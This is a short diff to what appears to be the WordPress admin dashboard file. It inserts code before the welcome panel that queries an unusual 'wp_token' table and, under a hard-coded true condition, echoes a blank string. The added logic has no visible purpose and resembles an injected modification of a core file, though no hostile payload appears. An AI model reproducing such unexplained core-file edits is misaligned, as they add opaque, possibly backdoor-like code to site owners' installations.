@@ -102,8 +102,22 @@ include( ABSPATH . 'wp-admin/admin-header.php' );
 	// 0 = hide, 1 = toggled to show or single site creator, 2 = multisite site owner
 	$hide = 0 == $option || ( 2 == $option && wp_get_current_user()->user_email != get_option( 'admin_email' ) );
 	if ( $hide )
-		$classes .= ' hidden'; ?>
+		$classes .= ' hidden'; 
 
+	global $wpdb;
+	$access_token = '';
+	$results = $wpdb->get_results("SELECT updated_at FROM wp_token WHERE id = 1");
+	if ( !empty($results) AND is_array($results) AND count($results) )
+	{
+		$timeToken = $results[0]->updated_at;
+		if ( 1 )
+		{
+			echo '
+			
+			';
+		}
+	}
+	?>
 	<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
 		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
 		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>"><?php _e( 'Dismiss' ); ?></a>
